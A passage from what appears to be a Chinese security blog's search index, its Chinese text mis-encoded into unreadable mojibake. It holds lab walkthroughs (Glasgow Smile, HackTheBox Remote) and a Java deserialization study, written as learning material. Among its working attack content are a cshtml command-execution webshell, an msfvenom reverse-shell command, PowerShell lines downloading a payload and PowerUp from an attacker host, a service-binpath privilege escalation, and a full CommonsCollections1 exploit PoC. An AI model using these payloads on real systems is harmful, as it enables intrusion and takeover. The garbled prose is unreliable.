´adminå’Œjokerçš„å¼±å£ä»¤ï¼Œæ²¡çˆ†å‡ºæ¥ã€‚ä¸€ç­¹è«å±•ï¼Œé‚ç„äº†ä¸‹åˆ«äººçš„walkthroughï¼ŒåŸæ¥æ˜¯ç”¨åˆ©ç”¨ä¸»é¡µç”Ÿæˆçš„å­—å…¸ï¼Œçˆ†ç ´joomlaç”¨æˆ·çš„å¼±å£ä»¤ï¼Œè¿™ä¸ªæ˜¯çœŸçš„æ²¡æƒ³åˆ°ã€‚ 1python pydictor.py -plug scratch http://192.168.189.134/joomla å°†ç”Ÿæˆçš„å­—å…¸å¯¼å…¥åˆ°burpsuiteçˆ†ç ´ï¼Œå¾ˆå¿«å°±çˆ†ç ´å‡ºå¯†ç ä¸ºGothamã€‚ åœ¨ç½‘ä¸Šæœç´¢åˆ°äº†joomlaç¼–è¾‘æ¨¡æ¿å¤„èƒ½æ”¹phpä»£ç å’Œä¸Šä¼ æ–‡ä»¶ï¼Œäºæ˜¯æ’å…¥phpä¸€å¥è¯æˆåŠŸGetshellã€‚ http://192.168.189.134/joomla/administrator/index.php?option=com_templates&amp;view=templates åœ¨templates/beez3/ç›®å½•ä¸‹æ‰¾åˆ°äº†webshellã€‚ åå¼¹ä¸€ä¸ªshellåˆ°æœ¬æœºï¼Œç”¨privilege-escalation-awesome-scripts-suiteæ²¡æ‰«å‡ºæ¥ä¸œè¥¿ï¼ŒæŸ¥çœ‹äº†joomlaçš„é…ç½®æ–‡ä»¶ï¼Œå‘ç°äº†msyqlçš„ç™»å½•å¯†ç ã€‚ è¦æƒ³åœ¨mysqlç•Œé¢æ­£å¸¸äº¤äº’ï¼Œè¦è¿è¡Œä»¥ä¸‹å‘½ä»¤å¼¹ä¸€ä¸ªæ­£å¸¸çš„shellã€‚ 1python3 -c \"import pty;pty.spawn('/bin/bash')\" æ˜¾ç¤ºæ‰€æœ‰æ•°æ®åº“å‘ç°è¿˜æœ‰ä¸ªbatjokeåº“ï¼Œé‡Œé¢çš„taskforceè¡¨è®°å½•ç€å‡ ä¸ªç”¨æˆ·çš„å¯†ç ï¼Œå…¶ä¸­robæ˜¯é¶æœºå…¶ä¸­ä¸€ä¸ªç”¨æˆ·ã€‚ 123show databases;use batjoke;select * from taskforce; æ‹¿å¯†ç å»base64è§£ç ï¼Œç»“æœä¸º???AllIHaveAreNegativeThoughts???ï¼Œç”¨æ­¤å¯†ç é€šè¿‡sshæˆåŠŸç™»å½•åˆ°robç”¨æˆ·ã€‚ 1ssh rob@192.168.189.134 åœ¨robç”¨æˆ·homeç›®å½•è·å¾—äº†ç¬¬ä¸€ä¸ªflagå’Œä¸€ä¸²å¯†æ–‡ã€‚ çœ‹ç€å¯†æ–‡çš„æ ·å­ï¼Œä»¥æˆ‘æ°´ctfçš„ç»éªŒï¼Œé¦–å…ˆå°±çŒœåˆ°äº†æ˜¯å¤å…¸å¯†ç çš„å‡¯æ’’åŠ å¯†ã€‚ æ¥ç€base64è§£ç æœ€åä¸€è¡Œçš„base64ï¼Œç»“æœä¸ºI33hope99my0death000makes44more8cents00than0my0life0ã€‚ ç”¨è§£ç çš„ç»“æœåˆ‡æ¢åˆ°äº†abnerç”¨æˆ·ï¼Œè·å¾—äº†ç¬¬äºŒä¸ªflagï¼Œå¹¶å‘ç°historyæœ‰ç‚¹ä¸œè¥¿ï¼Œè§£å‹äº†ä¸€ä¸ªå«.dear_penguins.zipå‹ç¼©åŒ…ã€‚ ç”¨findå‘½ä»¤æ‰¾åˆ°äº†å‹ç¼©åŒ…çš„ä½ç½®ï¼Œè§£å‹éœ€è¦å¯†ç ï¼Œçˆ†ç ´äº†ä¸€ç•ªä¹Ÿæ²¡çˆ†ç ´å‡ºæ¥ï¼Œæœ€åç”¨abnerçš„ç™»å½•å¯†ç å°±æ­£ç¡®äº†ã€‚ å†…å®¹çš„æœ€åä¸€è¡ŒåŒæ ·æ˜¯å¦ä¸€ä¸ªç”¨æˆ·penguinçš„ç™»å½•å¯†ç ï¼Œä¸è¿‡è¿™å›ä¸éœ€è¦è§£ç ã€‚ å»åˆ°homeç›®å½•ä¸‹çš„SomeoneWhoHidesBehindAMaskç›®å½•ï¼Œçœ‹è§äº†ç¬¬ä¸‰flagï¼Œå¹¶ä¸”å‘ç°äº†ä¸¤ä¸ªå±äºrootçš„æ–‡ä»¶ã€‚ æŠŠpspyä¼ ä¸Šé¶æœºï¼Œå‘ç°rootç”¨æˆ·é€šè¿‡å®šæ—¶ä»»åŠ¡å®šæ—¶è¿è¡Œç›®å½•ä¸‹çš„.trash_oldã€‚ åœ¨æ–‡ä»¶é‡Œæ’å…¥åå¼¹shellï¼Œç­‰ä¸€ä¼šå„¿æˆåŠŸææƒã€‚","link":"/2020/06/28/GlasgowSmile_walkthrough/"},{"title":"HackTheBox Remote walkthrough","text":"â€¦ ä¿¡æ¯æ”¶é›†æ‰«æé¶æœºå¼€æ”¾ç«¯å£ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯å¼€æ”¾äº†ftpã€httpå’Œå…±äº«æ–‡ä»¶æœåŠ¡ã€‚ 1nmap -A 10.10.10.180 ftpæœåŠ¡å…è®¸åŒ¿åç™»å½•ï¼Œä½†æ˜¯é‡Œé¢æ²¡ç”¨ä¸œè¥¿ã€‚ httpä¸Šçš„ç½‘ç«™ï¼Œé€šè¿‡æœç´¢åº•éƒ¨çš„å…³é”®è¯å‘ç°æ˜¯å¼€æºçš„asp.netçš„CMSï¼Œæœ€è¿‘ä¸€ä¸ªæ¼æ´æ˜¯åå°RCEã€‚ è®¿é—®å…±äº«æ–‡ä»¶è®¿é—®ï¼Œæœ‰ä¸€ä¸ªæ–‡ä»¶å¤¹ä»»ä½•äººéƒ½èƒ½è®¿é—®ï¼ŒæŒ‚è½½åˆ°æœ¬åœ°å‘ç°æ˜¯ç½‘ç«™çš„æºç ã€‚ 12showmount -e 10.10.10.180sudo mount 10.10.10.180:/site_backups site_backups &lt;img src=â€æ•è·.JPG) GETSHELLåœ¨æºç çš„web.configé‡Œå‘ç°machineKeyï¼Œä½†æ˜¯å‰å°å¥½åƒæ²¡ç”¨åˆ°asp.netçš„æ§ä»¶ï¼Œæ‰€ä»¥æ²¡æ´¾ä¸Šç”¨åœºã€‚ æ¥ç€åˆåœ¨App_Dataæ–‡ä»¶å¤¹é‡Œå‘ç°äº†Sql Serverçš„æ•°æ®åº“æ–‡ä»¶ï¼Œåœ¨é‡Œé¢å‘ç°ç®¡ç†å‘˜å¯†ç çš„hashï¼Œæ‹¿å»ç½‘ä¸Šç¢°æ’å¾—åˆ°å¯†ç ã€‚ ä½¿ç”¨è´¦æˆ·`admin@htb.localå¯†ç baconandcheese`åœ¨http://10.10.10.180/umbraco/å¤„ç™»å½•åˆ°åå°ã€‚ç¿»çœ‹ä¸‹åŠŸèƒ½ï¼Œå‘ç°ä¸ªåˆ›å»ºcshtmlæ¨¡æ¿çš„åœ°æ–¹ï¼Œé‚ä¸Šä¸ªcshtmlçš„webshellã€‚ 12345678910111213141516171819202122232425262728293031@using System.Diagnostics;@using System.IO;@functions { private string ExecuteCommand(string command) { try { ProcessStartInfo processStartInfo = new ProcessStartInfo(); processStartInfo.FileName = \"cmd.exe\"; processStartInfo.Arguments = \"/c \" + command; processStartInfo.RedirectStandardOutput = true; processStartInfo.UseShellExecute = false; Process process = Process.Start(processStartInfo); using (StreamReader streamReader = process.StandardOutput) { string ret = streamReader.ReadToEnd(); return ret; } } catch (Exception ex) { return ex.ToString(); } }}@{ if (Request.QueryString[\"p1ay2win\"] != null) { @ExecuteCommand(Request.QueryString[\"p1ay2win\"]); }} è·å¾—ç¬¬ä¸€ä¸ªflagã€‚ ææƒç”¨msfvemonç”Ÿäº§ä¸€ä¸ªmeterpreterçš„åå¼¹shellï¼Œåœ¨æœ¬æœºä¸Šèµ·ä¸€ä¸ªhttpæœåŠ¡ï¼Œé€šè¿‡powershellä¸Šä¼ åå¼¹shellå’ŒPowerUpææƒæ£€æµ‹è„šæœ¬ã€‚ 1234msfvenom -p windows/x64/meterpreter_reverse_http lhost=10.10.x.x lport=9001 -f exe -o re.exepython -m SimpleHTTPServerpowershell (new-object System.Net.WebClient).DownloadFile( &apos;http://10.10.X.X:8000/re.exe&apos;,&apos;c:\\inetpub\\wwwroot\\views\\re.exe&apos;)powershell (new-object System.Net.WebClient).DownloadFile( &apos;http://10.10.X.X:8000/PowerUp.ps1&apos;,&apos;c:\\inetpub\\wwwroot\\views\\PowerUp.ps1&apos;) åœ¨é¶æœºè¿è¡Œåå¼¹shellï¼Œç”¨åå¼¹shellçš„sessionå¼€å¯ä¸€ä¸ªäº¤äº’çš„shellï¼Œè¿è¡ŒPowerUpçš„invoke-allchecksåŠŸèƒ½ï¼Œå‘ç°å¯ä¿®æ”¹UsoSvcçš„binpathææƒã€‚ 1powershell -c &quot;import-module c:\\inetpub\\wwwroot\\views\\PowerUp.ps1;invoke-allchecks&quot; ä¿®æ”¹UsoSvcçš„binpathï¼Œåœ¨é‡æ–°å¯åŠ¨è¿™ä¸ªç¨‹åºçš„æ—¶å€™å°±èƒ½æ‰§è¡Œbinpathçš„å‘½ä»¤ã€‚ 123sc config UsoSvc binpath=\"c:\\inetpub\\wwwroot\\views\\re.exe\"sc stop UscSvcsc start UscSvc å½“æ—¶ææƒçš„æ—¶å€™å‘ç°ä¸ªé—®é¢˜ï¼Œbinpathçš„å‘½ä»¤è¿è¡Œä¸€æ®µæ—¶é—´å°±ä¼šè¢«killæ‰ï¼Œæ‰¾äº†ä¸‹å‘½ä»¤ç”¨cmd /cå¼€å¤´å°±åœ¨ä¸è¢«killã€‚ 1sc config UsoSvc binpath=\"cmd /c c:\\inetpub\\wwwroot\\views\\re.exe\" æ”¹äº†binpathåï¼Œstartè¿™ä¸ªusosvcæœåŠ¡ä¼šå‡ºç°failedå­—æ ·ï¼Œè¿™æ˜¯æ­£å¸¸ç°è±¡ï¼Œå‘½ä»¤è¿˜æ˜¯ä¼šè¢«è¿è¡Œã€‚ æœ€åï¼Œä¼šå¾—åˆ°ä¸€ä¸ªsystemæƒé™çš„sessionã€‚æ²¡å›¾â€¦å¤ç°æ—¶å€™è¯•äº†å‡ å¤©åˆresetæ­»æ´»ç™»å½•ä¸ä¸Šâ€¦ åè®°hacktheboxæœ‰ä¸ç”¨ä¸‹è½½å’Œæœ‰windowsé¶æœºçš„å¥½å¤„ï¼Œä½†æ˜¯å°±æ˜¯é€Ÿåº¦æ…¢ã€ç¯å¢ƒç»å¸¸æœ‰é—®é¢˜ï¼Œéš¾æå“¦ã€‚","link":"/2020/08/09/HackTheBox_Remote_walkthrough/"},{"title":"JAVAååºåˆ—åŒ–å­¦ä¹ ","text":"å‰è¨€å›é¡¾å®ŒPHPååºåˆ—åŒ–ï¼Œæ¥ç€å°±æ¥å­¦ä¹ Javaååºåˆ—åŒ–äº†ã€‚è·ç¦»ä¸Šä¸€ç¯‡PHPååºåˆ—åŒ–æ°´æ–‡è¿‡å»å¿«åŠä¸ªæœˆäº†ï¼Œæ„Ÿè§‰æ—¶é—´è¿‡å¾—å¥½å¿«å•Šï¼Œåœ¨æŸäº›ç‰¹æ®Šæ—¶åˆ»ä¹Ÿå¥½ç…ç†¬å•Šã€‚ä¸ç®¡æ€ä¹ˆè¯´ï¼Œè¿™æ®µæ—¶é—´çœ‹äº†å¥½å¤šJavaååºåˆ—åŒ–çš„æ–‡ç« ï¼Œä¹ŸåŠ¨æ‰‹å¤ç°äº†ä¸‹ï¼Œå¯¹ååºåˆ—åŒ–çš„åŸç†ã€åˆ©ç”¨æ¡ä»¶ã€åˆ©ç”¨æ–¹æ³•æœ‰äº†åˆæ­¥çš„è®¤è¯†ã€‚ èƒ¡è¯Œäº†è¿™ä¹ˆå¤šï¼Œå°±ä¸‹æ¥æ˜¯å¯¹Javaååºåˆ—åŒ–å­¦ä¹ çš„è®°å½•ã€‚ Javaåºåˆ—åŒ–ç®€ä»‹Javaçš„åºåˆ—åŒ–ä¹Ÿæ˜¯å’ŒPHPåºåˆ—åŒ–ä¸€æ ·ï¼Œä¸ºäº†å®ç°å¯¹è±¡çš„æŒä¹…åŒ–ã€‚é™¤æ­¤ä¹‹å¤–ï¼ŒJavaåºåˆ—åŒ–è¿˜å¯é€šè¿‡çš„ç½‘ç»œé€šä¿¡ï¼Œå®ç°åœ¨ä¸åŒçš„å¹³å°ä¼ è¾“å¯¹è±¡ï¼Œå‡ºç°çš„åœºæ™¯æœ‰JNDIçš„RMIå’ŒLADPç­‰ã€‚ Javaåºåˆ—åŒ–ä¸ååºåˆ—åŒ–Javaä¸åŒäºPHPå¯ä»¥åºåˆ—åŒ–å’Œååºåˆ—åŒ–ä»»æ„ç±»ï¼ŒJavaåªæœ‰æœ¬ç±»æˆ–çˆ¶ç±»å®ç°äº†Serializableæˆ–Externalizableæ¥å£ï¼Œä¸”è‹¥å®ä¾‹å˜é‡å¼•ç”¨äº†å…¶ä»–å¯¹è±¡ï¼Œè¯¥å¯¹è±¡ä¹Ÿéœ€è¦èƒ½è¢«åºåˆ—åŒ–ã€‚ 12345678910111213141516171819202122public class Unserialize implements Serializable{ public Object obj; public static void main(String[] args) throws Exception { Unserialize obj = new Unserialize(); obj.obj = new SerializableTest(); FileOutputStream out = new FileOutputStream(\"test.txt\"); ObjectOutputStream obj_out = new ObjectOutputStream(out); obj_out.writeObject(obj); out.close(); FileInputStream in = new FileInputStream(\"test.txt\"); ObjectInputStream in_obj = new ObjectInputStream(in); in_obj.readObject(); in_obj.close(); }}class SerializableTest implements Serializable{}class Test {} è‹¥åºåˆ—åŒ–ä¸€ä¸ªæ²¡æœ‰å®ç°Serializableçš„ç±»ï¼Œåˆ™ä¼šæŠ›å‡ºNotSerializableExceptionå¼‚å¸¸ã€‚Externalizableæ˜¯Serializableçš„å­ç±»ï¼Œåºåˆ—åŒ–çš„ç”¨æ³•ä¸€æ ·ï¼Œä½†å¿…é¡»é‡å†™readExternalå’ŒwriteExternalæ–¹æ³•ã€‚åºåˆ—åŒ–çš„ç»“æœæ˜¯ä»¥ACEDå¼€å¤´çš„å­—èŠ‚åºåˆ—ï¼ŒJavaä¹Ÿæ˜¯æŒ‰ä¸€å®šçš„è§„åˆ™è¿›è¡Œåºåˆ—åŒ–çš„ï¼Œä½†åºåˆ—åŒ–ç»“æœçš„å¯è¯»æ€§æ²¡æœ‰PHPé‚£ä¹ˆé«˜ã€‚ Javaåºåˆ—åŒ–å¹¶æ²¡æœ‰PHPè¿™ä¹ˆå¤šçš„é­”æœ¯æ–¹æ³•ï¼Œåªæœ‰å½“åºåˆ—åŒ–çš„ç±»é‡å†™äº†readObjectæˆ–readExternalæ–¹æ³•ï¼Œæ‰èƒ½ä½œä¸ºååºåˆ—åŒ–æ¼æ´çš„å…¥å£ã€‚ 12345678910111213141516171819public class Unserialize implements Serializable { private void readObject(ObjectInputStream in) throws Exception { in.defaultReadObject(); Runtime.getRuntime().exec(\"calc\"); } public static void main(String[] args) throws Exception { Unserialize obj = new Unserialize(); FileOutputStream out = new FileOutputStream(\"test.txt\"); ObjectOutputStream obj_out = new ObjectOutputStream(out); obj_out.writeObject(obj); out.close(); FileInputStream in = new FileInputStream(\"test.txt\"); ObjectInputStream in_obj = new ObjectInputStream(in); in_obj.readObject(); in_obj.close(); }} å½“ç„¶ï¼Œå®é™…æƒ…å†µä¸‹æ²¡äººä¼šç›´æ¥åœ¨readObjectä¸­å†™ä¸ªå‘½ä»¤æ‰§è¡Œçš„åŠŸèƒ½ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œååºåˆ—åŒ–æ¼æ´éƒ½æ˜¯ä½¿ç”¨å¤šä¸ªå¯åºåˆ—åŒ–çš„ç±»å½¢æˆåˆ©ç”¨é“¾ï¼Œç„¶ååˆ©ç”¨åå°„æœºåˆ¶å®ç°æƒ³è¦çš„åŠŸèƒ½ã€‚ Javaåå°„æœºåˆ¶åå°„æœºåˆ¶å¯ä»¥å®ç°åœ¨ç¼–è¯‘æ—¶æ— éœ€ç¡®å®šæ‰€ä½¿ç”¨çš„çš„ç±»ï¼Œåœ¨è¿è¡Œæ—¶å†ç¡®å®šã€‚å¯¹ä»»æ„ä¸€ä¸ªç±»ï¼Œéƒ½èƒ½çŸ¥é“è¿™ä¸ªç±»çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ï¼Œå¯¹ä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œéƒ½èƒ½è°ƒç”¨å®ƒçš„ä»»æ„ä¸€ä¸ªæ–¹æ³•å’Œå±æ€§ã€‚ ä»¥ä¸‹ä»£ç æ˜¯ä»¥åå°„çš„æ–¹å¼å®ç°å¼¹è®¡ç®—å™¨ï¼Œå…ˆåé€šè¿‡Class.forNameè·å–Classå®ä¾‹ï¼Œç„¶ågetMethodè·å–æ–¹æ³•ï¼Œæœ€åinvokeè°ƒç”¨æ–¹æ³•ã€‚å¯¹äºä¸€äº›éœ€è¦ä½¿ç”¨å®ä¾‹è°ƒç”¨çš„æ–¹æ³•ï¼Œé¦–å…ˆéœ€è¦é€šè¿‡getConstructoræ–¹æ³•è·å–æ„é€ æ–¹æ³•å®ä¾‹ï¼Œå†è°ƒç”¨newInstanceæ–¹æ³•è·å–è¯¥ç±»çš„å®ä¾‹ã€‚ 12345678public class Reflect { public static void main(String[] args) throws Exception { Class runtime = Class.forName(\"java.lang.Runtime\"); Method getRuntime = runtime.getMethod(\"getRuntime\"); Method exec = runtime.getMethod(\"exec\",String.class); exec.invoke(getRuntime.invoke(runtime), \"calc\"); }} ä¸Šé¢å½¢å¦‚getXXXçš„æ–¹æ³•éƒ½æ˜¯åªèƒ½è·å–é»˜è®¤æ„é€ å‡½æ•°æˆ–å…¬æœ‰æ–¹æ³•å’Œå±æ€§ï¼Œè·å–éé»˜è®¤æ„é€ å‡½æ•°æˆ–éå…¬æœ‰æ–¹æ³•å’Œå±æ€§éœ€è¦ä½¿ç”¨å½¢å¦‚getDeclaredXXXçš„æ–¹æ³•ï¼Œéå…¬æœ‰æ–¹æ³•å’Œå±æ€§è¿˜éœ€ä½¿ç”¨setAccessibleæ–¹æ³•è®¾ç½®å¯è®¿é—®ã€‚ 1234567891011121314151617181920212223242526public class Reflect { public static void main(String[] args) throws Exception { Class reflectTest = Class.forName(\"com.test.ReflectTest\"); Constructor constructor = reflectTest.getDeclaredConstructor(String.class); Object test = constructor.newInstance(\"calc\"); Method execute = reflectTest.getDeclaredMethod(\"execute\"); execute.setAccessible(true); execute.invoke(test); }}class ReflectTest { private String cmd; ReflectTest() { } ReflectTest(String cmd) { this.cmd = cmd; } private void execute() throws IOException { if (cmd.isEmpty()) cmd = \"calc\"; Runtime.getRuntime().exec(cmd); }} ååºåˆ—åŒ–åˆ©ç”¨ååºåˆ—åŒ–åˆ©ç”¨å¤ç°ç»å…¸çš„CommonsCollectionsPOPé“¾ï¼Œè¿˜æœ‰RMIæ”»å‡»æœåŠ¡ç«¯å’ŒJNDIæ³¨å…¥ã€‚ CommonsCollections1CommonsCollections1æ˜¯Javaååºåˆ—åŒ–åˆ©ç”¨å·¥å…·ysoserialå…¶ä¸­çš„ä¸€ä¸ªpayloadï¼Œç”±äºcommons-collectionsè¿™ä¸ªä¾èµ–åŒ…åº”ç”¨å¾ˆå¹¿æ³›ï¼Œæ‰€ä»¥è¿™ä¸ªpayloadå¾ˆé€šç”¨ï¼Œä½†å¯¹jreæ˜¯æœ‰è¦æ±‚çš„ï¼Œç‰ˆæœ¬éœ€è¦åœ¨1.7u21ä»¥ä¸‹ã€‚ POPé“¾æ„é€ ï¼Œæœ¬æ–‡é€šè¿‡ä¸‹æ–­ç‚¹è°ƒè¯•æ¥å­¦ä¹ ã€‚CommonsCollections1çš„payloadä½¿ç”¨ä»¥ä¸‹çš„å‘½ä»¤ç”Ÿæˆï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œwindowsä¸‹ä¸èƒ½ç”¨powershellç”Ÿæˆpayloadï¼Œç”Ÿæˆçš„payloadæ˜¯é”™çš„ï¼Œä¼šå¤šå‡ºæ¥00å­—èŠ‚ã€‚ 1java -jar .\\ysoserial.jar CommonsCollections1 \"calc.exe\" &gt; cc.bin ååºåˆ—åŒ–çš„å…¥å£ç›´æ¥é€šè¿‡æ–‡ä»¶è¾“å…¥åºåˆ—åŒ–å†…å®¹å¹¶ååºåˆ—åŒ–å³å¯ï¼ŒåŒæ—¶éœ€è¦åœ¨Runtimeçš„execæ–¹æ³•ä¸‹ä¸ªæ–­ç‚¹ã€‚ 1234567public class DebugUnserialize { public static void main(String[] args) throws Exception{ FileInputStream file = new FileInputStream(\"cc1.bin\"); ObjectInputStream in = new ObjectInputStream(file); in.readObject(); }} å¯åŠ¨è°ƒè¯•å°±èƒ½åœ¨IDEAä¸­çœ‹åˆ°è°ƒç”¨æ ˆï¼Œé™¤å»ååºåˆ—åŒ–å’Œæ­£å¸¸invokeæ–¹æ³•çš„è°ƒç”¨ï¼Œä¸ååºåˆ—åŒ–POPé“¾ç›¸å…³çš„è°ƒç”¨æ ˆæœ‰çº¢æ¡†è¿™ä¸‰å—ï¼Œä¸»è¦çš„æ˜¯ä¸­é—´è¿™ä¸€å—ã€‚ ä»æ ˆé¡¶å¾€æ ˆåº•çœ‹ï¼ŒInvokerTransformerçš„transformæ–¹æ³•æœ€ç»ˆåå°„è°ƒç”¨Runtimeçš„execæ–¹æ³•ã€‚è·Ÿè¿›InvokerTransformerçš„transformæ–¹æ³•ï¼Œå½“inputéç©ºæ—¶ä¼šè¿›è¡Œä¸€ä¸ªåå°„æ–¹å¼è°ƒç”¨æ–¹æ³•çš„æ“ä½œã€‚iMethodNameã€iParamTypeså’ŒiArgsæ˜¯InvokerTransformerçš„å±æ€§ï¼Œå±äºå¯æ§å˜é‡ï¼Œè€Œinputä¸æ˜¯è¯¥ç±»çš„å±æ€§ï¼Œæ­¤æ—¶inputçš„å€¼ä¸ºRuntimeçš„å®ä¾‹ã€‚ å›æº¯åˆ°ChainedTransformerçš„transformæ–¹æ³•ï¼Œä¸€ä¸ªforå¾ªç¯éå†iTransformerså±æ€§ï¼Œå¹¶è°ƒç”¨ä»–çš„transformæ–¹æ³•ï¼Œè¯¥æ–¹æ³•çš„objectå‚æ•°é™¤äº†ç¬¬ä¸€ä¸ªä¹‹å¤–ï¼Œå…¶ä»–éƒ½æ˜¯ä¸Šä¸€ä¸ªå¾ªç¯transformçš„è¿”å›å€¼ã€‚ 123456public Object transform(Object object) { for (int i = 0; i &lt; iTransformers.length; i++) { object = iTransformers[i].transform(object); } return object;} iTransformersæ˜¯ä¸€ä¸ªTransformeræ•°ç»„ï¼Œè€ŒTransformeræ˜¯ä¸€ä¸ªæ¥å£ï¼Œä¸Šé¢çš„ä¸¤ä¸ªç±»ChainedTransformerå’ŒInvokerTransformeréƒ½å®ç°äº†è¿™ä¸ªæ¥å£ã€‚å½“å‰iTransformersçš„å¤§å°ä¸º5ï¼ŒåŒ…å«ä¸€ä¸ªConstantTransformerï¼Œä¸‰ä¸ªInvokerTransformerï¼Œå†åŠ ä¸€ä¸ªConstantTransformerï¼Œæ„Ÿè§‰æ•´ä¸ªPOPé“¾æœ€å·§å¦™çš„å°±åœ¨è¿™é‡Œã€‚ ç¬¬ä¸€ä¸ªConstantTransformerç›´æ¥è¿”å›ä»–çš„iConstantå±æ€§ï¼Œæ­¤æ—¶iConstantä¸ºRuntimeçš„Classå®ä¾‹ã€‚ æ¥ç€çš„InvokerTransformerï¼Œç»è¿‡ä¸€æ¬¡getMethodå†åŠ ä¸€æ¬¡åå°„æ–¹å¼è°ƒç”¨çš„getMethodè·å–åˆ°getRuntimeçš„Methodå®ä¾‹ï¼Œå¹¶è¿”å›ã€‚ æ¥ç€çš„InvokerTransformerï¼Œç»è¿‡ä¸¤æ¬¡invokeè°ƒç”¨äº†ä¸Šä¸€ä¸ªå¾ªç¯è¿”å›getRuntimeæ–¹æ³•ï¼Œå¹¶è¿”å›æ‰§è¡Œç»“æœã€‚è¿™é‡Œçš„iArgsä¹Ÿå°±æ˜¯ç¬¬äºŒæ¬¡çš„invokeçš„å‚æ•°ï¼Œæ˜¯ä¸€ä¸ªnullå’Œä¸€ä¸ªç©ºObjectæ•°ç»„ï¼Œå†å¤ç°æ—¶æŠŠæˆ‘æ•´æ‡µäº†ï¼Œä¸ºå•¥ä¸ç”¨å¯¹è±¡è°ƒç”¨getRuntimeæ–¹æ³•ã€‚åé¢æƒ³èµ·æ¥getRuntimeæ˜¯é™æ€æ–¹æ³•ï¼ŒæŸ¥èµ„æ–™å¾—çŸ¥é™æ€æ–¹æ³•ç”¨invokeåå°„è°ƒç”¨ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¼ nullå³å¯ã€‚ æœ€åä¸€ä¸ªInvokerTransformeråˆ©ç”¨ä¸Šä¸€ä¸ªå¾ªç¯getRuntimeè¿”å›çš„Runtimeå®ä¾‹ï¼Œåå°„è°ƒç”¨execæ‰§è¡Œå‘½ä»¤ã€‚ ç»§ç»­å›æº¯ï¼Œè·Ÿè¿›åˆ°LazyMapçš„getæ–¹æ³•ï¼Œmapå±æ€§ä¸å­˜åœ¨é”®ä¸ºkeyçš„å€¼ï¼Œç„¶åä½¿ç”¨factoryå±æ€§è°ƒç”¨tranformæ–¹æ³•ã€‚è¿™é‡Œä»¤factoryä¸ºä¸‹ä¸€è°ƒç”¨æ ˆé‡Œçš„ChainedTransformerå³å¯ã€‚ å†ç»§ç»­å›æº¯ï¼Œåœ¨AnnotationInvocationHandlerçš„invokeæ–¹æ³•é‡Œé¢ä½¿ç”¨è°ƒç”¨memberValueså±æ€§è°ƒç”¨getæ–¹æ³•ã€‚ 1234567891011121314public Object invoke(Object var1, Method var2, Object[] var3) { String var4 = var2.getName(); Class[] var5 = var2.getParameterTypes(); if (var4.equals(\"equals\") &amp;&amp; var5.length == 1 &amp;&amp; var5[0] == Object.class) { return this.equalsImpl(var3[0]); } else if (var5.length != 0) { throw new AssertionError(\"Too many parameters for an annotation method\"); } else { ... switch(var7) { case 0: ... default: Object var6 = this.memberValues.get(var4); AnnotationInvocationHandleræ˜¯éå…¬æœ‰çš„ç±»ï¼Œéœ€è¦åå°„æ¥æ„é€ ï¼Œå”¯ä¸€çš„ä¸€ä¸ªæ„é€ å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°éœ€è¦æ˜¯æ³¨è§£çš„ç±»ï¼Œä¸”å­˜åœ¨ä¸€ä¸ªæ¥å£ï¼Œæ¥å£ä¹Ÿæ˜¯éœ€è¦æœ‰æ³¨è§£ï¼Œå¦åˆ™å°±ä¼šæŠ›å‡ºä¸€ä¸ªAnnotationFormatErrorå¼‚å¸¸ã€‚ 123456789AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) { Class[] var3 = var1.getInterfaces(); if (var1.isAnnotation() &amp;&amp; var3.length == 1 &amp;&amp; var3[0] == Annotation.class) { this.type = var1; this.memberValues = var2; } else { throw new AnnotationFormatError(\"Attempt to create proxy for a non-annotation type.\"); }} åœ¨java.lang.annotaionåŒ…ä¸‹å¾ˆå¤šæ¥å£éƒ½æ»¡è¶³è¿™ä¸ªæ¡ä»¶ã€‚ åœ¨å¾€ä¸Šå›æº¯ï¼Œå‘ç°å¹¶æ²¡æœ‰ç›´æ¥è°ƒç”¨invokeæ–¹æ³•ï¼Œå› ä¸ºè¿™é‡Œç”¨åˆ°äº†åŠ¨æ€ä»£ç†æœºåˆ¶ï¼Œå½“ç”Ÿæˆçš„ä»£ç†å®ä¾‹è°ƒç”¨æ–¹æ³•æ—¶ä¼šå…ˆè°ƒç”¨ç±»é‡Œçš„invokeæ–¹æ³•ã€‚AnnotationInvocationHandlerå®ç°äº†InvocationHandleræ¥å£ï¼Œæ‰€ä»¥å†å¾€ä¸Šå›æº¯åˆæ˜¯ä¸€ä¸ªAnnotationInvocationHandlerï¼Œä½†å®ƒçš„memberValueså±æ€§æ˜¯AnnotationInvocationHandlerçš„ä»£ç†å®ä¾‹ã€‚ æœ€åå®Œæ•´çš„POCï¼š 12345678910111213141516171819202122232425262728293031323334353637383940package com.test;import org.apache.commons.collections.*;import org.apache.commons.collections.functors.*;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.annotation.Retention;import java.lang.reflect.*;import java.util.*;public class ApacheCommonsCollections1 { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}), new ConstantTransformer(1) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); Map map = LazyMap.decorate(new HashMap(), chainedTransformer); Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Retention.class, map); Map map1 = (Map) Proxy.newProxyInstance( Map.class.getClassLoader(), new Class[]{Map.class}, invocationHandler ); Object obj = constructor.newInstance(Retention.class, map1); FileOutputStream fileOutputStream = new FileOutputStream(\"cc1.txt\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(obj); }} CommonsCollectionsåé¢å‡ 